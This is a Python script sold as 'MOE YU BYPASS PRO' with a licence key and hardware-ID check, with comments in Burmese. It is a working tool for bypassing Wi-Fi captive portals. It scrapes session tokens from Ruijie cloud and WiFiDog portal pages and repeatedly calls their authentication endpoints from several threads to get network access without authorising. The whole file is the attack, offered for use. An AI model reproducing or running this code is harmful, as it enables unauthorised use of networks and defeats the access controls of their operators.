import requests
import re
import urllib3
import time
import threading
import logging
import random
import sys
import datetime
import subprocess
import os
import uuid
from urllib.parse import urlparse, parse_qs, urljoin
from rich.console import Console
from rich.panel import Panel
from rich.align import Align
from rich.text import Text

# ===============================
# CONFIG & INITIALIZATION
# ===============================
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
console = Console()

# Cloud/Router Block မဖြစ်စေရန် Thread အရေအတွက်ကို ထိန်းညှိထားသည်
PING_THREADS = 4 
PING_INTERVAL = 0.5 

# COLOR SYSTEM
RED = "\033[91m"
GREEN = "\033[92m"
CYAN = "\033[96m"
YELLOW = "\033[93m"
MAGENTA = "\033[95m"
RESET = "\033[0m"

logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(message)s", datefmt="%H:%M:%S")
stop_event = threading.Event()

# GitHub Database URL
URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/refs/heads/main/key.txt"

BABY_LOGO = """
[bold cyan]
      _      
    _(_)_    
   (_)@(_)   [white] <( Let's Play! )[/white]
     (_)\  / 
      /  ||  
  ___/___||___
 |____________|
[/bold cyan]
"""

BANNER = """
[bold #00FF00]
 ╔╦╗╔═╗╔═╗  ╦ ╦╦ ╦
 ║║║║ ║║╣   ╚╦╝║ ║
 ╩ ╩╚═╝╚═╝   ╩ ╚═╝
      [#00FF00]M O E   Y U   H A C K E R[/#00FF00]
[/bold #00FF00]
"""

def get_hwid():
    id_file = os.path.expanduser("~/.moe_yu_id")
    try:
        if os.path.exists(id_file):
            with open(id_file, "r") as f: return f.read().strip()
        raw_id = str(uuid.uuid4()).split('-')[0].upper()
        new_id = f"MOE-{raw_id}-{random.randint(100, 999)}"
        with open(id_file, "w") as f: f.write(new_id)
        return new_id
    except: return "MOE-DEFAULT-999"

def get_current_gateway():
    """လက်ရှိချိတ်ထားသော Network ၏ Gateway IP ကို ရှာဖွေခြင်း"""
    try:
        gateway = subprocess.check_output("ip route show | grep default | awk '{print $3}'", shell=True).decode().strip()
        return gateway if gateway else "192.168.110.1"
    except:
        return "192.168.110.1"

def check_expiry(expiry_str):
    if expiry_str.upper() in ["NONE", "LIFETIME", "FREE"]: return True, "Lifetime"
    try:
        expiry_date = datetime.datetime.strptime(expiry_str, '%Y-%m-%d')
        if datetime.datetime.now() > expiry_date: return False, expiry_date.strftime('%d-%b-%Y')
        return True, expiry_date.strftime('%d-%b-%Y')
    except: return True, "Lifetime"

def display_hacker_flag():
    console.print(Align.center(BABY_LOGO))
    console.print(Align.center(BANNER))
    console.print(Align.center("[bold cyan]MOE YU BYPASS PRO ENGINE v7.8[/bold cyan]\n"))

def simpler_hacker_typing(text, style="bold green"):
    console.print("[bold #00FF00]>>> [/bold #00FF00]", end="")
    for char in text:
        console.print(Text(char, style=style), end="")
        sys.stdout.flush()
        time.sleep(0.02)
    console.print()

def success_fireworks():
    for _ in range(15):
        fire = " " * random.randint(1, 45) + random.choice(["✨", "💥", "🌟", "⭐"])
        console.print(Text(fire, style=random.choice(["yellow", "cyan", "green", "white"])))
        time.sleep(0.01)

def check_license_hacker_style():
    my_hwid = get_hwid()
    console.clear()
    display_hacker_flag()
    console.print(Align.center(Panel(f"[bold white]YOUR HWID: [yellow]{my_hwid}[/yellow][/bold white]", title="[bold red]DEVICE INFO[/bold red]", border_style="bold cyan", expand=False)))
    try: user_key = input("\n  [SECURITY_ACCESS] @MoeYu_").strip()
    except: sys.exit()
    if not user_key: sys.exit()
    try:
        res = requests.get(URL, timeout=10)
        lines = [l.strip() for l in res.text.splitlines() if l.strip()]
        for entry in lines:
            parts = entry.split("|")
            if user_key == parts[0].strip():
                db_hwid = parts[2].strip() if len(parts) > 2 else "FREE"
                if db_hwid != "FREE" and db_hwid != my_hwid:
                    console.print("\n[bold red]❌ HWID MISMATCH![/bold red]")
                    sys.exit()
                is_active, date_label = check_expiry(parts[1].strip() if len(parts) > 1 else "None")
                if is_active:
                    success_fireworks()
                    simpler_hacker_typing("ACCESS_GRANTED: AUTHENTICATION SUCCESS")
                    console.print(Align.center(f"[bold green]STATUS: ACTIVE | EXPIRY: {date_label}[/bold green]\n"))
                    return True
        console.print("\n[bold red]❌ INVALID KEY![/bold red]")
        sys.exit()
    except:
        console.print("\n[bold red]📡 CONNECTION ERROR![/bold red]")
        sys.exit()

# ===============================
# BYPASS ENGINE (MULTI-MODE)
# ===============================
def start_bypass_process():
    while not stop_event.is_set():
        try:
            session = requests.Session()
            # Redirect အဆင့်ဆင့်ကို လိုက်ရန် allow_redirects=True ထားသည်
            r = session.get("http://connectivitycheck.gstatic.com/generate_204", timeout=5, allow_redirects=True)
            
            if r.status_code == 204:
                time.sleep(8)
                continue
            
            portal_url = r.url
            r1 = session.get(portal_url, timeout=10, verify=False)
            
            # --- IMPROVED PARSING (Cloud & Local) ---
            params = parse_qs(urlparse(portal_url).query)
            
            # sessionId, token, auth_id စသည့် နာမည်အမျိုးမျိုးကို စစ်ခြင်း
            sid = (params.get('sessionId') or 
                   params.get('session_id') or 
                   params.get('token') or 
                   params.get('auth_id') or 
                   [None])[0]
            
            # URL ထဲမှာ မတွေ့လျှင် HTML ထဲတွင် Regex ဖြင့် ထပ်ရှာခြင်း
            if not sid:
                sid_match = re.search(r'(?:sessionId|session_id|token|auth_id)=([a-zA-Z0-9_\-]+)', r1.text)
                sid = sid_match.group(1) if sid_match else None
            
            if sid:
                current_gw = get_current_gateway()
                gw_port = params.get('gw_port', ['2060'])[0]
                
                # Cloud Mode (portal-as) သို့မဟုတ် Local Mode ခွဲခြားခြင်း
                if "ruijienetworks.com" in portal_url:
                    auth_link = f"https://portal-as.ruijienetworks.com/api/auth/login?sessionId={sid}"
                    mode_label = "CLOUD"
                else:
                    auth_link = f"http://{current_gw}:{gw_port}/wifidog/auth?token={sid}"
                    mode_label = "LOCAL"
                
                def pulse_ping():
                    while not stop_event.is_set():
                        try:
                            session.get(auth_link, timeout=5)
                            sys.stdout.write(f"{GREEN}[✓] {mode_label} | SID: {sid[:12]}.. | GW: {current_gw} | ACTIVE{RESET}\n")
                            sys.stdout.flush()
                        except: pass
                        time.sleep(PING_INTERVAL)

                for _ in range(PING_THREADS):
                    threading.Thread(target=pulse_ping, daemon=True).start()
                
                while True:
                    try:
                        if session.get("http://www.google.com", timeout=3).status_code == 200:
                            time.sleep(10)
                        else: break
                    except: break
            else:
                sys.stdout.write(f"{RED}[-] TARGET SID NOT FOUND. RETRYING...{RESET}\n")
                time.sleep(3)
        except Exception:
            time.sleep(5)

if __name__ == "__main__":
    if check_license_hacker_style():
        console.print(Panel(Align.center("[bold white]🔥 MOE YU BYPASS PRO v7.8 ACTIVATED 🔥[/bold white]"), 
                            subtitle="[bold yellow]Support: Local & Cloud Portal[/bold yellow]",
                            border_style="bold red", expand=False))
        try: start_bypass_process()
        except KeyboardInterrupt: sys.exit()
